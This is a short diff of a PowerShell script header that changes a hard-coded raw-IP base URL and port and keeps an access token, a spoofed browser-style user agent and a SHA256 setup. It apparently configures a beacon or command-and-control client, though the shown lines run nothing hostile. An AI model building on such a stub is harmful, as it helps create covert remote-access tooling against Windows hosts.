@@ -1,6 +1,6 @@
 $ErrorActionPreference = 'Stop'
 [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
-$B = 'http://51.75.118.5:20216'
+$B = 'http://51.75.118.17:20116'
 $T = 'tk-48232543-a9d6F'
 $U = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1.19041.1'
 $s = [Security.Cryptography.SHA256]::Create()
